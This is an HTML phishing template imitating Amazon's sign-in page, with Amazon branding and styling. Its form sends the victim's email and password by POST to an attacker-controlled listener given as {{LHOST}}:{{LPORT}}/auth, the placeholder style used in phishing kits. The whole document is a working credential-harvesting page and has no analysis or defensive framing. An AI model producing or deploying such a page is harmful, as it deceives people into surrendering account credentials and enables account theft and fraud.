<!DOCTYPE html>
<html>
<head>
    <title>Amazon Sign-In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #fff; font-family: "Amazon Ember", Arial, sans-serif; display: flex; flex-direction: column; align-items: center; margin-top: 50px; }
        .container { border: 1px solid #ddd; padding: 20px 26px; border-radius: 4px; width: 300px; margin-top: 20px; }
        h1 { font-weight: 400; font-size: 28px; margin-bottom: 15px; margin-top: 0; }
        label { font-weight: bold; font-size: 13px; padding-bottom: 2px; display: block; margin-top: 10px; }
        input { width: 100%; padding: 7px; border: 1px solid #a6a6a6; border-radius: 3px; box-sizing: border-box; outline: none; margin-bottom: 10px; }
        input:focus { border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,.5); }
        button { width: 100%; padding: 8px; background: linear-gradient(to bottom, #f7dfa5, #f0c14b); border: 1px solid #a88734; border-radius: 3px; cursor: pointer; margin-top: 15px; font-size: 13px; }
        button:hover { background: linear-gradient(to bottom, #f5d78e, #eeb933); }
    </style>
</head>
<body>
    <h2 style="margin: 0; font-weight: normal;">amazon</h2>
    <div class="container">
        <h1>Sign-In</h1>
        <form action="http://{{LHOST}}:{{LPORT}}/auth" method="POST">
            <label>Email or mobile phone number</label>
            <input type="text" name="email" required>
            <label>Password</label>
            <input type="password" name="pass" required>
            <button type="submit">Continue</button>
        </form>
    </div>
</body>
</html>
